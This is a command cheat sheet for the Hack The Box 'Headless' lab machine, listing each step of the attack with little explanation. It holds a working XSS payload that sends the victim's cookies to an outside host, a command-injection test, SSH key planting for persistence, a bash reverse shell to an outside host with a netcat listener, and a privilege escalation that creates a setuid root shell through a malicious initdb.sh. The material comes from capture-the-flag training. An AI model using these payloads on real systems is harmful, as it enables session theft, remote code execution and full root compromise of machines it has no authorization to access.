# 🧠 HTB: Headless - Command Notes

## 🔍 Recon

```bash
nmap -p- --min-rate 10000 10.10.11.8
nmap -p 22,5000 -sCV 10.10.11.8
```

## 📂 Directory Brute Force

```bash
feroxbuster -u http://10.10.11.8:5000
```

## 🔎 Filter Testing / Single Character Fuzzing

```bash
ffuf -u http://10.10.11.8:5000/support \
-d 'fname=0xdf&lname=0xdf&email=0xdf@headless.htb&phone=9999999999&message=FUZZ' \
-w /opt/SecLists/Fuzzing/alphanum-case-extra.txt \
-H 'Content-Type: application/x-www-form-urlencoded' \
-mr 'Your IP address has been flagged'
```

## 🧪 XSS Payload (Cookie Stealer)

```html
<script>var i=new Image(); i.src="http://10.10.14.6/?c="+document.cookie;</script>
```

## 🌐 Host Web Server to Catch Cookie

```bash
python -m http.server 80
```

## 🍪 Manually Set Cookie (in Firefox Dev Tools)

```text
is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
```

## 💥 Command Injection Test (Burp Repeater)

```text
date=2023-09-15; id
```

## 🔐 Generate SSH Key

```bash
ssh-keygen -t ed25519 -f key
```

## 📥 Upload Public Key (in initdb.sh or through command injection)

```bash
echo "public_key_content" > ~/.ssh/authorized_keys
```

## 🔑 SSH into Box

```bash
ssh -i key dvir@10.10.11.8
```

## 📤 Reverse Shell Payload (Base Bash Reverse Shell)

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'
```

(Encode `&` as `%26` for POST requests)

## 📞 Listen for Shell

```bash
nc -lnvp 443
```

## 🐚 Upgrade TTY Shell

```bash
script /dev/null -c bash
# Then:
[CTRL+Z]
stty raw -echo; fg
reset
# Type: screen
```

## 🔎 Check Sudo Permissions

```bash
sudo -l
```

## 📜 Priv-Esc Exploit: Create Malicious `initdb.sh`

```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 6777 /tmp/0xdf' > initdb.sh
chmod +x initdb.sh
```

## ⚙️ Execute `syscheck`

```bash
sudo syscheck
```

## ⬆️ Root Shell

```bash
/tmp/0xdf -p
```

## 🧼 Clean Up and Get Root Flag

```bash
rm /tmp/0xdf
cat /root/root.txt
```